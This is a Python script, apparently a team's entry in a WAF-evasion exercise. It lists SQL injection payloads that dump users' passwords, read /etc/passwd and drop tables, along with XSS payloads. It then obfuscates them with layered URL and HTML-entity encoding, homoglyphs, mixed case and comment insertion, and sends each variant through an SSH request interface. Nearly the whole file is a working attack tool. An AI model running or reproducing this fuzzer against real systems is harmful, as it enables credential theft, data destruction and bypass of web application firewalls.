

# Название команды: ЧВК Сырочек
import random
import re
from urllib.parse import quote, unquote
#import ssh_interface
#import rdp_interface


#from RDP_Interface import INIT
#from RDP_Interface import Request


from SSH_Interface import INIT
from SSH_Interface import Request


requests = [
    "' OR 1=1--",
    "' OR '1'='1",
    "' UNION SELECT null, null--",
    "' UNION SELECT 1, @@version--",
    "' UNION SELECT 1, table_name FROM information_schema.tables--",
    "' UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users'--",
    "' UNION SELECT username, password FROM users--",
    "' AND SLEEP(5)--",
    "'; DROP TABLE users--",
    "' OR 1=1 LIMIT 1--",
    "' ORDER BY 1--",
    "' ORDER BY 3--",
    "' AND (SELECT COUNT(*) FROM users) > 0--",
    "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) > 65--",
    "' UNION SELECT 1, LOAD_FILE('/etc/passwd')--",
    "' UNION SELECT 1, user()--",
    "' UNION SELECT 1, database()--",
    "' AND 1=IF(1=1, SLEEP(3), 0)--",
    "' OR EXISTS(SELECT * FROM users WHERE username='admin')--",
    "' UNION SELECT group_concat(table_name),2 FROM information_schema.tables WHERE table_schema=database()—"
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<body onload=alert(1)>',
    '<iframe src="javascript:alert(1)">',
    '<a href="javascript:alert(1)">click</a>',
    '<input onfocus=alert(1) autofocus>',
    '<details open ontoggle=alert(1)>',
    '<marquee onstart=alert(1)>',
    '"><script>alert(1)</script>',
    "' onmouseover=alert(1) '",
    '<x onclick="alert(1)">click</x>',
    '''<div style="background:url('javascript:alert(1)')">''',
    '<object data="javascript:alert(1)">',
    '<embed src="data:text/html,<script>alert(1)</script>">',
    '<form action="javascript:alert(1)"><input type=submit>',
    '<isindex action="javascript:alert(1)" type=image>',
    '''<xss style="background:url('javascript:alert(1)')">''',
    '<math><brute href="javascript:alert(1)">click</brute></math>',
    '<video><source onerror="javascript:alert(1)">',
    ]


INIT()

def Coding(request):

    #Универсальная функция обфускации SQL и XSS запросов
    #с многоуровневым кодированием для обхода WAF
    
    
    def is_sql_injection(text):
        """Определяет, является ли запрос SQL инъекцией"""
        sql_patterns = [
            r'\b(SELECT|UNION|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER|EXEC)\b',
            r'\b(FROM|WHERE|AND|OR|LIKE|JOIN|TABLE|DATABASE)\b',
            r'\b(null|true|false|version|user|database)\b',
            r'(\-\-|\#|\/\*|\*\/)',
            r'(\'|\"|;|\\\*|\\\-)'
        ]
        return any(re.search(pattern, text, re.IGNORECASE) for pattern in sql_patterns)
    
    def is_xss_injection(text):
        #Определяет, является ли запрос XSS атакой
        xss_patterns = [
            r'<script[^>]*>.*?</script>',
            r'<img[^>]*src[^>]*>',
            r'<iframe[^>]*>.*?</iframe>',
            r'on\w+\s*=',
            r'javascript:',
            r'alert\(|confirm\(|prompt\(',
            r'<svg[^>]*>.*?</svg>',
            r'<body[^>]*>.*?</body>',
            r'<input[^>]*>'
        ]
        return any(re.search(pattern, text, re.IGNORECASE) for pattern in xss_patterns)
    
    def apply_html_entities(text, level=1):
        #Применяет HTML entities кодирование
        if level == 1:
            # Базовое кодирование кавычек и специальных символов
            text = text.replace("'", "&#39;")
            text = text.replace('"', "&#34;")
            text = text.replace('<', "&lt;")
            text = text.replace('>', "&gt;")
            text = text.replace('&', "&amp;")
        elif level == 2:
            # Полное кодирование всех символов
            encoded_chars = []
            for char in text:
                if char.isalnum():
                    encoded_chars.append(char)
                else:
                    # Случайный выбор между десятичными и шестнадцатеричными entities
                    if random.random() > 0.5:
                        encoded_chars.append(f"&#{ord(char)};")
                    else:
                        encoded_chars.append(f"&#x{ord(char):x};")
            text = ''.join(encoded_chars)
        elif level >= 3:
            # Многоуровневое кодирование
            text = apply_html_entities(apply_html_entities(text, 1), 2)
        
        return text
    
    def apply_url_encoding(text, level=1):
        #Применяет URL кодирование
        if level == 1:
            text = quote(text)
        elif level == 2:
            # Двойное URL кодирование
            text = quote(quote(text))
        elif level >= 3:
            # Многоуровневое кодирование
            for _ in range(level):
                text = quote(text)
        return text
    
    def apply_unicode_obfuscation(text):
        #Применяет Unicode обфускацию
        unicode_map = {
            'a': ['а', 'ɑ', 'а'],  # кириллические и греческие аналоги
            'e': ['е', 'ё', 'ē'],
            'i': ['і', 'і', 'ī'],
            'o': ['о', 'ο', 'ō'],
            'u': ['υ', 'μ'],
            's': ['ѕ', 'š'],
            'c': ['с', 'ç'],
            'S': ['Ѕ', 'Ś'],
            '<': ['＜', '⟨', '❮'],
            '>': ['＞', '⟩', '❯'],
            '"': ['″', '„', '“'],
            "'": ['′', '‘', '’'],
            ' ': [' ', ' ', ' ']  # разные пробелы
        }
        
        result = []
        for char in text:
            if char.lower() in unicode_map and random.random() > 0.7:
                result.append(random.choice(unicode_map[char.lower()]))
            else:
                result.append(char)
        return ''.join(result)
    
    def apply_case_obfuscation(text):
        #Применяет обфускацию регистра
        if is_sql_injection(text):
            # Для SQL: смешанный регистр ключевых слов
            sql_keywords = ['SELECT', 'UNION', 'FROM', 'WHERE', 'AND', 'OR', 'INSERT', 'UPDATE', 'DELETE', 'DROP', 'CREATE']
            
            for keyword in sql_keywords:
                pattern = re.compile(re.escape(keyword), re.IGNORECASE)
                text = pattern.sub(lambda m: ''.join(
                    random.choice([c.upper(), c.lower()]) for c in m.group()), text)
        
        elif is_xss_injection(text):
            # Для XSS: обфускация тегов и атрибутов
            xss_patterns = {
                'script': ['ScRiPt', 'SCRipt', 'scRIpt'],
                'img': ['iMg', 'IMg', 'imG'],
                'iframe': ['iFrAmE', 'IFrame', 'ifrAME'],
                'onload': ['oNlOaD', 'ONload', 'onLOAD'],
                'alert': ['aLeRt', 'ALert', 'aleRT']
            }
            
            for pattern, replacements in xss_patterns.items():
                text = re.sub(pattern, lambda m: random.choice(replacements), text, flags=re.IGNORECASE)
        
        return text
    
    def apply_whitespace_obfuscation(text):
        #Применяет обфускацию пробелов
        whitespace_chars = ['%20', '%09', '%0a', '%0b', '%0c', '%0d', '//', '/**/']
        
        # Замена пробелов в SQL
        if is_sql_injection(text):
            text = re.sub(r'\s+', lambda m: random.choice(whitespace_chars), text)
        
        # Замена пробелов в XSS (в определенных местах)
        elif is_xss_injection(text):
            # Замена пробелов в атрибутах тегов
            text = re.sub(r'(<[^>]+)\s+([^>]*>)', 
                         lambda m: m.group(1) + random.choice(whitespace_chars) + m.group(2), text)
        
        return text
    
    def apply_comment_obfuscation(text):
        #Добавляет случайные комментарии
        if is_sql_injection(text):
            comments = ['/**/', '/*!*/', '/*!50000*/', '--', '#']
            words = text.split()
            if len(words) > 2:
                # Вставляем комментарии между словами
                positions = random.sample(range(1, len(words)), min(3, len(words)-1))
                for pos in sorted(positions, reverse=True):
                    if pos < len(words):
                        words.insert(pos, random.choice(comments))
                text = ' '.join(words)
        
        return text
    
    def apply_multilevel_encoding(text, max_level=3):
        #Применяет многоуровневое кодирование
        encoding_functions = [
            lambda x: apply_html_entities(x, random.randint(1, 2)),
            lambda x: apply_url_encoding(x, random.randint(1, 2)),
            apply_unicode_obfuscation,
            apply_case_obfuscation,
            apply_whitespace_obfuscation,
            apply_comment_obfuscation
        ]
        
        encoded_text = text
        encoding_level = random.randint(1, max_level)
        
        for _ in range(encoding_level):
            func = random.choice(encoding_functions)
            encoded_text = func(encoded_text)
            
            # С вероятностью 30% применяем дополнительное кодирование
            if random.random() < 0.3:
                additional_func = random.choice(encoding_functions)
                encoded_text = additional_func(encoded_text)
        
        return encoded_text
    
    # Основная логика обработки
    if not request or not isinstance(request, str):
        return request
    
    original_request = request
    request_obs = original_request
    
    # Определяем тип инъекции и применяем соответствующие методы
    is_sql = is_sql_injection(original_request)
    is_xss = is_xss_injection(original_request)
    
    if is_sql or is_xss:
        # Применяем многоуровневое кодирование
        request_obs = apply_multilevel_encoding(original_request)
        
        # Дополнительная специфическая обфускация
        if is_sql:
            # Для SQL: гарантируем работоспособность с HTML entities
            if '&#39;' not in request_obs and "'" in original_request:
                request_obs = request_obs.replace("'", "&#39;")
            
        elif is_xss:
            # Для XSS: гарантируем обфускацию тегов
            if '&lt;' not in request_obs and '<' in original_request:
                request_obs = request_obs.replace('<', '&lt;')
            if '&gt;' not in request_obs and '>' in original_request:
                request_obs = request_obs.replace('>', '&gt;')
    
    return request_obs

# Дополнительные утилиты для работы с функцией
def generate_obfuscated_variants(payload, count=5):
    """Генерирует несколько вариантов обфускации"""
    return [Coding(payload) for _ in range(count)]


    
    

# Пример использования
if __name__ == "__main__":
    # Тестирование функции
    for payload in requests:
        print(f"\nИсходный: {payload}")
        obfuscated = Coding(payload)
        print(f"Обфусцированный: {obfuscated}")
        print(f"Длина: {len(obfuscated)} символов")
        Code, Response = Request(obfuscated)

    
    
    
    








